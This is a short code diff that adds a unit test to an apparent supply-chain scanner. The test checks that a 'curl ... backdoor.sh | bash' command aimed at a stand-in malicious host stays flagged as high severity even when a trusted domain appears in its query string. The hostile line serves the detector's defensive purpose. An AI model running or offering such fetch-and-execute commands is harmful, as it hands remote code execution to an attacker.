@@ -899,6 +899,16 @@ class TestSupplyChainSafePatterns:
         sc2 = [f for f in findings if f.rule_id == "SC2"]
         assert all(f.confidence <= 0.15 for f in sc2)
 
+    def test_sc2_trusted_domain_in_query_is_not_downgraded(self) -> None:
+        findings = sc_mod.analyze(
+            "curl https://malicious.evil/backdoor.sh?ref=github.com | bash",
+            "setup.sh",
+            "shell",
+        )
+        sc2 = [f for f in findings if f.rule_id == "SC2"]
+        assert len(sc2) >= 1
+        assert all(f.severity == Severity.HIGH for f in sc2)
+
     def test_sc2_pip_install_is_safe(self) -> None:
         findings = sc_mod.analyze(
             "curl https://bootstrap.pypa.io/get-pip.py | python3", "setup.sh", "shell"
